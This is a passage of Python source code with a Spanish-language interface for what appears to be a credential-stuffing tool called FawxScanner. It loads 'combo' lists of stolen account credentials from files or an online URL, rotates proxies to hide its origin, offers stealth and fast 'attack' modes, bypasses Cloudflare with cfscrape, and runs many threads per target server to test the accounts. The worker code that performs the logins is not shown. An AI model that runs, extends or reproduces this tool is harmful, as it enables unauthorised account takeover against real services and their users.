                selected_file = os.path.join(self.proxy_dir, proxy_files[choice_idx])
                clear_screen()
                show_banner()
                print(f"\n{Colors.BRIGHT_YELLOW}Tipos de Proxy:{Colors.RESET}")
                print(f"{Colors.BRIGHT_CYAN}[1]{Colors.ORANGE} IpVanish (usuario/contraseña)")
                print(f"{Colors.BRIGHT_CYAN}[2]{Colors.ORANGE} SOCKS4")
                print(f"{Colors.BRIGHT_CYAN}[3]{Colors.ORANGE} SOCKS5")
                print(f"{Colors.BRIGHT_CYAN}[4]{Colors.ORANGE} HTTP/HTTPS{Colors.RESET}")
                proxy_type = input(f"\n{Colors.BLUE}Seleccione el tipo de proxy: {Colors.RESET}").strip()
                if proxy_type not in ('1', '2', '3', '4'):
                    print(f"{Colors.YELLOW}Tipo inválido, usando SOCKS5 por defecto.{Colors.RESET}")
                    proxy_type = '3'
                
                total_proxies = self.proxy_manager.load_proxies(selected_file, proxy_type)
                if total_proxies > 0:
                    self.use_proxy = True
                    print(f"{Colors.BRIGHT_GREEN}Cargados {total_proxies} proxies válidos desde el archivo {proxy_files[choice_idx]}{Colors.RESET}")
                else:
                    print(f"{Colors.BRIGHT_RED}No se cargaron proxies válidos. Desactivando uso de proxies.{Colors.RESET}")
                    self.use_proxy = False
            else:
                print(f"{Colors.BRIGHT_RED}¡Selección inválida!{Colors.RESET}")
                self.use_proxy = False
        except (ValueError, IndexError):
            print(f"{Colors.BRIGHT_RED}¡Selección inválida!{Colors.RESET}")
            self.use_proxy = False

    def configure_attack_type(self):
        print(f"\n{Colors.BRIGHT_YELLOW}Tipos de Ataque Disponibles:{Colors.RESET}")
        print(f"{Colors.GREEN}[1]{Colors.RESET} Ataque Estándar {Colors.RED}(Recomendado){Colors.RESET}")
        print(f"{Colors.GREEN}[2]{Colors.RESET} Ataque Silencioso {Colors.RED}(Lento){Colors.RESET}")
        print(f"{Colors.GREEN}[3]{Colors.RESET} Ataque Rápido {Colors.RED}(Menos verificaciones){Colors.RESET}")
        print(f"{Colors.GREEN}[4]{Colors.RESET} Ataque Completo {Colors.RED}(Todas las verificaciones){Colors.RESET}")
        choice = input(f"\n{Colors.ORANGE}Seleccione el tipo de ataque {Colors.BRIGHT_CYAN}[{Colors.BRIGHT_GREEN}1{Colors.BRIGHT_CYAN}]: {Colors.RESET}").strip()
        self.attack_type = {"2": "Stealth", "3": "Fast", "4": "Full"}.get(choice, "Standard")

    def load_combo_list(self):
        print(f"\n{Colors.BRIGHT_RED}Opciones de Combo:{Colors.RESET}")
        print(f"{Colors.ORANGE}[0] {Colors.GREEN}Combo en línea (Automático){Colors.RESET}")
        combo_files = [f for f in os.listdir(self.combo_dir) if f.endswith('.txt')]
        for i, file in enumerate(combo_files, 1):
            print(f"{Colors.ORANGE}[{i}] {Colors.YELLOW}{file.replace('.txt', '')}{Colors.RESET}")
        choice = input(f"\n{Colors.RED}Seleccione el combo: {Colors.RESET}").strip()
        
        total_loaded = 0
        if choice == '0':
            total_loaded = self.load_combo_online(PREDEFINED_COMBO_ONLINE_URL)
        else:
            try:
                choice_idx = int(choice) - 1
                if 0 <= choice_idx < len(combo_files):
                    path = os.path.join(self.combo_dir, combo_files[choice_idx])
                    total_loaded = self.load_combo_from_file(path)
                else:
                    print(f"{Colors.BRIGHT_RED}¡Selección inválida!{Colors.RESET}")
                    sys.exit(1)
            except ValueError:
                print(f"{Colors.BRIGHT_RED}¡Selección inválida!{Colors.RESET}")
                sys.exit(1)
        
        if total_loaded == 0:
            print(f"{Colors.BRIGHT_RED}¡No se encontraron cuentas válidas en el combo!{Colors.RESET}")
            print(f"{Colors.BRIGHT_YELLOW}Por favor, verifica el archivo o intenta de nuevo.{Colors.RESET}")
            sys.exit(1)
        
        print(f"{Colors.BRIGHT_GREEN}Cargadas {total_loaded} cuentas desde {self.combo_file_name}{Colors.RESET}")
        time.sleep(2)

    def start_scan(self):
        clear_screen()
        show_banner()
        print(f"\n{Colors.BRIGHT_MAGENTA}Iniciando escaneo en {len(self.servers)} servidor(es):{Colors.RESET}")
        for i, server in enumerate(self.servers, 1):
            flag = get_country_flag(server['timezone'], server['country_code'])
            region = server['timezone'].split('/')[-1].replace('_', ' ') if '/' in server['timezone'] else server['timezone']
            print(f"{server['server_name_color']}Servidor {i}: {server['url']}{Colors.RESET}")
            print(f"  ↳ Estado: {(Colors.BRIGHT_GREEN + 'En línea') if server['status'] == 'Online' else (Colors.BRIGHT_RED + 'Fuera de línea')}{Colors.RESET}")
            print(f"  ↳ IP: {Colors.BRIGHT_YELLOW}{server['ip']}{Colors.RESET}")
            print(f"  ↳ Región: {Colors.BRIGHT_YELLOW}{region} {flag}{Colors.RESET}")
        
        print(f"\n{Colors.BRIGHT_CYAN}Combo: {Colors.ORANGE}{self.combo_file_name.replace('.txt', '')} ({len(self.combo_lines)} cuentas){Colors.RESET}")
        print(f"{Colors.BRIGHT_CYAN}Hilos por servidor: {Colors.BRIGHT_YELLOW}{self.num_bots}{Colors.RESET}")
        print(f"{Colors.BRIGHT_CYAN}Total de hilos: {Colors.BRIGHT_YELLOW}{self.num_bots * len(self.servers)}{Colors.RESET}")
        print(f"{Colors.BRIGHT_CYAN}Usando proxy: {Colors.BRIGHT_YELLOW}{'Sí' if self.use_proxy else 'No'}{Colors.RESET}")
        if self.use_proxy:
            print(f"{Colors.BRIGHT_CYAN}Proxies cargados: {Colors.BRIGHT_YELLOW}{len(self.proxy_manager.proxies)}{Colors.RESET}")
        print(f"{Colors.BRIGHT_CYAN}Nickname: {Colors.BRIGHT_YELLOW}{self.nickname}   {Colors.RESET}")
        input(f"\n{Colors.ORANGE}Presiona Enter para comenzar...{Colors.RESET}")
        
        self.start_time = time.time()
        threads = []
        for i in range(len(self.servers)):
            for _ in range(self.num_bots):
                t = threading.Thread(target=self.worker, args=(i,))
                t.daemon = True
                threads.append(t)
                t.start()
        
        scan_complete = False
        while not scan_complete:
            clear_screen()
            show_banner()
            self.update_status()
            
            finished_servers = sum(1 for s in self.servers if s['total_tested'] >= len(self.combo_lines))
            if finished_servers == len(self.servers):
                scan_complete = True

            time.sleep(0.8)

        while self.active_bots > 0:
            time.sleep(0.5)

        self.show_final_summary()
        input(f"\n{Colors.BRIGHT_GREEN}Presiona Enter para salir...{Colors.RESET}")

def main():
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    dependencies = ['requests', 'cfscrape', 'colorama']
    for dep in dependencies:
        if not check_installation(dep):
            print(f"{Colors.BRIGHT_YELLOW}Instalando {dep}...{Colors.RESET}", end='', flush=True)
            if not install_package(dep):
                print(f"{Colors.BRIGHT_RED}\n¡Error al instalar {dep}! Por favor, instálalo manualmente con 'pip install {dep}' y intenta de nuevo.{Colors.RESET}")
                sys.exit(1)
            else:
                print(f"{Colors.BRIGHT_GREEN} OK!{Colors.RESET}")

    scanner = FawxScanner()
    
    clear_screen()
    show_banner()
    scanner.configure_servers()

    if scanner.servers:
        clear_screen()
        show_banner()
        scanner.nickname = input(f"\n{Colors.BRIGHT_CYAN}Tu nickname [{Colors.BRIGHT_GREEN}👺𝐅𝐀𝐖𝐗🤴   {Colors.BRIGHT_CYAN}]: {Colors.RESET}").strip() or "👺𝐅𝐀𝐖𝐗🤴"

        clear_screen()
        show_banner()
        use_proxy_input = input(f"\n{Colors.BRIGHT_CYAN}¿Usar proxy? (S/N) [{Colors.BRIGHT_GREEN}N{Colors.BRIGHT_CYAN}]: {Colors.RESET}").strip().lower()
        if use_proxy_input in ('s', 'si', 'y', 'yes'):
            clear_screen()
            show_banner()
            scanner.configure_proxies()

        clear_screen()
        show_banner()
        scanner.configure_attack_type()

        clear_screen()
        show_banner()
        print(f"\n{Colors.BRIGHT_YELLOW}Configuración de hilos (bots):{Colors.RESET}")
        threads_input = input(f"{Colors.BRIGHT_CYAN}Número de hilos por servidor [{Colors.BRIGHT_GREEN}20{Colors.BRIGHT_CYAN}]: {Colors.RESET}").strip()
        try:
            scanner.num_bots = int(threads_input) if threads_input else 20
        except ValueError:
            scanner.num_bots = 20

        clear_screen()
        show_banner()
        scanner.load_combo_list()

        scanner.start_scan()
    else:
        print(f"{Colors.BRIGHT_RED}No se configuraron servidores. Saliendo...{Colors.RESET}")

if __name__ == "__main__":
    main()